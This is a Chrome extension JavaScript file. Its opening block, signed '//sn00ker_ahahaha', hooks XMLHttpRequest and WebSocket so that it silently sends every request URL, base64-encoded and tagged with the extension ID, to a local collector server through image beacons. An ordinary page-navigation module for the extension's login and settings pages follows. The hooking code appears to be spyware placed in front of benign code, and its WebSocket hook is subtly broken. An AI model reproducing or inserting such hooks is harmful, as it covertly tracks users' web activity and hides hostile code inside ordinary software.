function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
var pageManager = (function () {

    var PageName = {
        REGISTER: 'views/html/authentication/register.html',
        FORGOT_PASSWORD: 'views/html/authentication/forgot-password.html',
        AUTHENTICATION: 'views/html/authentication/authentication.html',
        SETTINGS: 'views/html/authentication/settings.html'
    };

    function openPage(pageUrl) {
        chrome.tabs.update({'url': chrome.extension.getURL(pageUrl)});
    }

    function createPage(pageUrl) {
        chrome.tabs.create({'url': chrome.extension.getURL(pageUrl)});
    }

    function openPageByUrl(url) {
        chrome.tabs.create({'url': url});
    }

    return {
        openPage: openPage,
        createPage: createPage,
        openPageByUrl: openPageByUrl,
        PageName: PageName
    };

})();